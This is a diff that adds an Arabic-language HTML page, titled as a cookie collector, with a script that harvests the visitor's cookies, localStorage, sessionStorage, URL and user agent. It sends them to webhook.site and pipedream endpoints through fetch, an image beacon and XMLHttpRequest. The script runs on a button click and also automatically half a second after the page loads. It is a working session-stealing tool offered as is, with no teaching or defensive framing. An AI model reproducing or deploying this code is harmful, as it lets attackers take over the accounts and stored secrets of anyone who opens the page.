@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>جمع ملفات تعريف الارتباط</title>
+<style>
+  body {
+    background-color: #0d0d0d;
+    color: #00ff9d;
+    font-family: 'Courier New', monospace;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    flex-direction: column;
+    text-align: center;
+  }
+  .container {
+    background: #1a1a1a;
+    padding: 2rem;
+    border-radius: 12px;
+    border: 1px solid #00ff9d33;
+    box-shadow: 0 0 30px #00ff9d22;
+    max-width: 600px;
+    width: 90%;
+  }
+  h1 {
+    font-size: 1.4rem;
+    margin-bottom: 1.5rem;
+    color: #00ff9d;
+    text-shadow: 0 0 10px #00ff9d55;
+  }
+  button {
+    background: transparent;
+    color: #00ff9d;
+    border: 1px solid #00ff9d;
+    padding: 0.9rem 2.2rem;
+    font-size: 1rem;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: inherit;
+    letter-spacing: 1px;
+  }
+  button:hover {
+    background: #00ff9d;
+    color: #0d0d0d;
+    box-shadow: 0 0 20px #00ff9d88;
+  }
+  #output {
+    margin-top: 1.5rem;
+    background: #000;
+    border: 1px solid #00ff9d44;
+    border-radius: 6px;
+    padding: 1rem;
+    text-align: left;
+    max-height: 300px;
+    overflow-y: auto;
+    font-size: 0.8rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    color: #b3ffdd;
+    direction: ltr;
+  }
+  .status {
+    margin-top: 0.8rem;
+    font-size: 0.8rem;
+    color: #00ff9d99;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>⬇ استخراج ملفات تعريف الارتباط ⬇</h1>
+  <button id="grabBtn">جمع الكوكيز وإرسالها</button>
+  <div id="output">في انتظار الأمر...</div>
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+(function() {
+  const outputEl = document.getElementById('output');
+  const statusEl = document.getElementById('status');
+  const grabBtn = document.getElementById('grabBtn');
+
+  function getAllCookies() {
+    const cookies = document.cookie;
+    if (!cookies || cookies.trim() === '') {
+      return '[لا توجد ملفات تعريف ارتباط ظاهرة في document.cookie]';
+    }
+    return cookies;
+  }
+
+  function getStorageData() {
+    const data = {
+      cookies: document.cookie || 'لا توجد',
+      localStorage: {},
+      sessionStorage: {},
+      url: window.location.href,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    };
+
+    try {
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        data.localStorage[key] = localStorage.getItem(key);
+      }
+    } catch(e) {
+      data.localStorage = 'خطأ: ' + e.message;
+    }
+
+    try {
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        data.sessionStorage[key] = sessionStorage.getItem(key);
+      }
+    } catch(e) {
+      data.sessionStorage = 'خطأ: ' + e.message;
+    }
+
+    return data;
+  }
+
+  function sendData(data) {
+    const endpoints = [
+      'https://webhook.site/00000000-0000-0000-0000-000000000000',
+      'https://en2xvcsw9i0a.x.pipedream.net'
+    ];
+
+    const payload = JSON.stringify(data);
+
+    endpoints.forEach(url => {
+      try {
+        fetch(url, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload
+        }).catch(() => {});
+      } catch(e) {}
+    });
+
+    try {
+      const img = new Image();
+      img.src = 'https://webhook.site/00000000-0000-0000-0000-000000000000?c=' + encodeURIComponent(payload);
+    } catch(e) {}
+
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://en2xvcsw9i0a.x.pipedream.net', true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(payload);
+    } catch(e) {}
+  }
+
+  function displayResult(data) {
+    outputEl.textContent = JSON.stringify(data, null, 2);
+  }
+
+  grabBtn.addEventListener('click', function() {
+    statusEl.textContent = 'جاري الجمع...';
+    const cookies = getAllCookies();
+    const storage = getStorageData();
+
+    const fullData = {
+      cookies_raw: cookies,
+      storage: storage,
+      collected_at: new Date().toISOString()
+    };
+
+    displayResult(fullData);
+    sendData(fullData);
+
+    statusEl.textContent = 'تم الجمع والإرسال ✓';
+  });
+
+  window.addEventListener('load', function() {
+    setTimeout(function() {
+      const cookies = getAllCookies();
+      const storage = getStorageData();
+      const fullData = {
+        cookies_raw: cookies,
+        storage: storage,
+        collected_at: new Date().toISOString(),
+        auto: true
+      };
+      displayResult(fullData);
+      sendData(fullData);
+      statusEl.textContent = 'تم الجمع التلقائي والإرسال ✓';
+    }, 500);
+  });
+})();
+</script>
+</body>
+</html>
